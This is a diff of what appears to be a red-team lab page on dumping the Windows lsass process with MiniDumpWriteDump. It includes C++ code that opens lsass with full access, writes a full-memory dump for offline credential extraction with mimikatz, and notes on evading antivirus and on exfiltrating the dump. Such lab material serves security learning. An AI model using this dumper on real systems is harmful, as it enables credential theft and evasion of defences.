@@ -4,7 +4,7 @@ description: 'Evasion, Credential Dumping'
 
 # Dumping Lsass without Mimikatz with MiniDumpWriteDump
 
-This lab explores multiple ways of how to write a simple `lsass` process dumper using `MiniDumpWriteDump`. Lsass process dumps created with `MiniDumpWriteDump` can be loaded to mimikatz offline, where credential materials could be extracted.
+This lab explores multiple ways of how we can write a simple `lsass` process dumper using `MiniDumpWriteDump` API. Lsass process dumps created with `MiniDumpWriteDump` can be loaded to mimikatz offline, where credential materials could be extracted.
 
 {% hint style="warning" %}
 Note that you may get flagged by AVs/EDRs for reading lsass process memory.
@@ -12,7 +12,7 @@ Note that you may get flagged by AVs/EDRs for reading lsass process memory.
 
 ## MiniDumpWriteDump to Disk
 
-It's possible to use `MiniDumpWriteDump` API call to dump lsass.exe process memory.
+It's possible to use `MiniDumpWriteDump` API call to dump lsass process memory.
 
 ### Code
 
@@ -28,7 +28,11 @@ using namespace std;
 int main() {
 	DWORD lsassPID = 0;
 	HANDLE lsassHandle = NULL; 
+
+	// Open a handle to lsass.dmp - this is where the minidump file will be saved to
 	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	// Find lsass PID	
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	PROCESSENTRY32 processEntry = {};
 	processEntry.dwSize = sizeof(PROCESSENTRY32);
@@ -43,7 +47,10 @@ int main() {
 		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
 	}
 	
+	// Open handle to lsass.exe process
 	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
+	
+	// Create minidump
 	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
 	
 	if (isDumped) {
@@ -95,7 +102,7 @@ See how Windows Defender on Windows 10 is flagging up mimikatz immediately... bu
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-23-21-26-41.png)
 
-Of ourse, there is procdump that does the same thing and it does not get flagged by Windows defender, but it is always good to know there are alternatives you could turn to if you need to for whatever reason. 
+Of ourse, there is Sysinternal's `procdump` that does the same thing and it does not get flagged by Windows defender, but it is always good to know there are alternatives you could turn to if you need to for whatever reason. 
 
 ### Observations
 
@@ -105,11 +112,11 @@ As mentioned earlier, the code above uses a native windows API call `MiniDumpWri
 
 ## MiniDumpWriteDump to Memory using MiniDump Callbacks
 
-By default, `MiniDumpWriteDump` will dump lsass.exe process memory to disk, however it's possible to use `MINIDUMP_CALLBACK_INFORMATION` callbacks to create a process minidump in memory, where we could encrypt it before dropping to disk or exfiltrate it over the network.
+By default, `MiniDumpWriteDump` will dump lsass process memory to disk, however it's possible to use `MINIDUMP_CALLBACK_INFORMATION` callbacks to create a process minidump and store it memory, where we could encrypt it before dropping to disk or exfiltrate it over the network.
 
 ### Code
 
-The below code shows how we can create a minidump for a process and store its buffer in memory, where we can process the buffer as required.
+The below code shows how we can create a minidump for lsass and store its buffer in memory, where we can process it as required:
 
 ```cpp
 #include <windows.h>
@@ -230,14 +237,14 @@ On the right, we're executing the same code and it says that the minidump was wr
 ![MiniDumpWriteDump dumping lsass process to a memory location](../../.gitbook/assets/minidumpwritedump-dump-to-memory.gif)
 
 {% hint style="info" %}
-If you ever try using `MiniDumpWriteDump` to dump process memory to memory using named pipes, you will notice that the minidump file "kind of" gets created, but mimikatz is not able to read it. That's because the minidump file buffer is actually read/written non-sequentially \(you can see this from the screenshot in the top right corner - note the differing offsets of the write operations of the minidump data\), so when you are reading the minidump data using named pipes, you simply are writting the data in incorrect order, which effectively produces a corrupted minidump file.
+If you ever try using `MiniDumpWriteDump` to dump process memory to memory using named pipes, you will notice that the minidump file "kind of" gets created, but mimikatz is not able to read it. That's because the minidump buffer is actually written non-sequentially \(you can see this from the screenshot in the top right corner - note the differing offsets of the write operations of the minidump data\), so when you are reading the minidump using named pipes, you simply are writting the minidump data in incorrect order, which effectively produces a corrupted minidump file.
 {% endhint %}
 
 ### Other Ways
 
 Below are links to a couple of other cool solutions to the same problem.
 
-Implementing a custom `MiniDumpWriteDump` based on the `MiniDumpWriteDump` of ReactOS:
+Custom `MiniDumpWriteDump` implementation, based on the one from ReactOS:
 
 {% embed url="https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump" %}
 
